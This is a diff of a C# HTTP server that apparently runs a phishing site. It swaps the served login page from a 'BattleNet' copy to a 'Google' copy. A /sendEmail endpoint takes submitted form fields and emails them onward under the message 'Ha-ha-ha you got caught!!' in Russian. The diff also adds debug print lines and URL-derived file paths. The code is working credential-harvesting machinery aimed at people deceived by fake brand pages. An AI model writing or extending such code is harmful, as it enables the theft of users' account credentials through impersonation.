@@ -75,12 +75,14 @@ public class Server
             string filePath;
             if (request.Url.LocalPath.Equals("/"))
             {
-                filePath = Path.Combine(staticDir, "BattleNet", "index.html");
+                filePath = Path.Combine(staticDir, "Google", "index.html");
+                Console.WriteLine(filePath);
             }
             else if (request.Url.LocalPath == "/sendEmail")
             {
                 using (StreamReader reader = new StreamReader(request.InputStream))
                 {
+                    
                     string data = reader.ReadToEnd();
 
                     string[] formData = data.Split('&');
@@ -88,18 +90,22 @@ public class Server
                     var message = $"Ха-ха-ха ты попался!!";
                     SendEmail(message , formData);
                 }
-                filePath = Path.Combine(staticDir, "BattleNet", "index.html");
+                filePath = Path.Combine(staticDir, "Google", "index.html");
+                Console.WriteLine(filePath);
             }
             else if (!request.Url.LocalPath.Contains('.'))
             {
                 filePath = Path.Combine(staticDir, request.Url.LocalPath.TrimStart('/'), "index.html");
+                Console.WriteLine(filePath);
             }
             else
             {
                 var a = request.Url.LocalPath.TrimStart('/');
                 var b = a.Split('/');
+                filePath = a;
                 filePath = b[b.Length - 4] + "/" + b[b.Length - 3] + "/" + b[b.Length - 2] + "/" + b[b.Length - 1];
             }
+            
             if (File.Exists(filePath))
             {
                 var pageContents = File.ReadAllBytes(filePath);
